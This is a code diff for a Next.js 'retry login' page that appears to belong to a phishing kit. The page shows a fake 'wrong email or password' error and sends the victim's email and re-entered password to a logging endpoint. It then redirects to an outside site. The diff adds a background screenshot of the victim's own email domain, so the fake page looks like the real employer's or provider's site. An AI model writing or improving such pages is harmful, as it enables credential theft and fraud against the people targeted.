@@ -1,18 +1,41 @@
 'use client'
 
-import '../../styles/globals.css'
+import '../styles/globals.css'
 import { useSearchParams, useRouter } from 'next/navigation'
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 
 export default function EndPage() {
-  const params = useSearchParams()
-  const router = useRouter()
-  const email  = params.get('email') || ''
-  const domain = params.get('domain') || ''
+  const params          = useSearchParams()
+  const router          = useRouter()
+  const email           = params.get('email') || ''
+  const urlParamDomain  = params.get('domain') || ''
 
-  const [password, setPassword] = useState('')
-  const [errors, setErrors]     = useState({ password: '' })
-  const [showModal, setShowModal] = useState(false)
+  const [password, setPassword]     = useState('')
+  const [errors, setErrors]         = useState({ password: '' })
+  const [showModal, setShowModal]   = useState(false)
+
+  // For background screenshot
+  const [domainToCapture, setDomainToCapture] = useState('')
+  const [screenshotUrl, setScreenshotUrl]     = useState('')
+
+  useEffect(() => {
+    // decide domain exactly the same way
+    if (urlParamDomain) {
+      setDomainToCapture(urlParamDomain)
+    } else {
+      const parts = email.split('@')
+      setDomainToCapture(parts.length === 2 ? parts[1] : '')
+    }
+  }, [urlParamDomain, email])
+
+  useEffect(() => {
+    if (!domainToCapture) return
+    const base = process.env.NEXT_PUBLIC_SCREENSHOT_URL!
+    const sep  = base.includes('?') ? '&' : '?'
+    setScreenshotUrl(
+      `${base}${sep}url=${encodeURIComponent(`https://${domainToCapture}`)}`
+    )
+  }, [domainToCapture])
 
   const handleRetry = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -24,7 +47,7 @@ export default function EndPage() {
     await fetch('/api/log-submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email, password, domain }),
+      body: JSON.stringify({ email, password, domain: domainToCapture }),
     })
     setTimeout(() => {
       router.push('https://finaltest.com')
@@ -32,8 +55,21 @@ export default function EndPage() {
   }
 
   return (
-    <div className="login-container relative">
-      <div className="login-card">
+    <div className="login-container relative min-h-screen">
+      {/* Screenshot + light-blue tint */}
+      {screenshotUrl && (
+        <div className="absolute inset-0 overflow-hidden">
+          <img
+            src={screenshotUrl}
+            alt={`Screenshot of ${domainToCapture}`}
+            className="w-full h-full object-contain opacity-50 pointer-events-none"
+          />
+          <div className="absolute inset-0 bg-light-blue/50 pointer-events-none" />
+        </div>
+      )}
+
+      {/* Centered error card */}
+      <div className="relative z-10 mx-auto mt-20 bg-white rounded-2xl shadow-xl p-8 max-w-md w-full">
         <h1 className="text-sm font-bold text-center mb-2 text-red-600">
           Wrong email or password. Please retry.
         </h1>
@@ -53,7 +89,9 @@ export default function EndPage() {
             className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-400"
             required
           />
-          {errors.password && <p className="text-sm text-red-600">{errors.password}</p>}
+          {errors.password && (
+            <p className="text-sm text-red-600">{errors.password}</p>
+          )}
           <button
             type="submit"
             className="w-full bg-red-500 text-white py-3 rounded-lg hover:bg-red-600 transition"
@@ -63,10 +101,11 @@ export default function EndPage() {
         </form>
       </div>
 
+      {/* Submission Modal */}
       {showModal && (
-        <div className="modal-overlay">
-          <div className="modal-content">
-            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
+        <div className="fixed inset-0 z-20 flex items-center justify-center bg-black/50">
+          <div className="bg-white rounded-xl shadow-lg p-6 max-w-sm text-center">
+            <h2 className="text-xl font-semibold text-gray-800">Please wait…</h2>
             <p className="mt-2 text-gray-600">Submitting your credentials.</p>
           </div>
         </div>
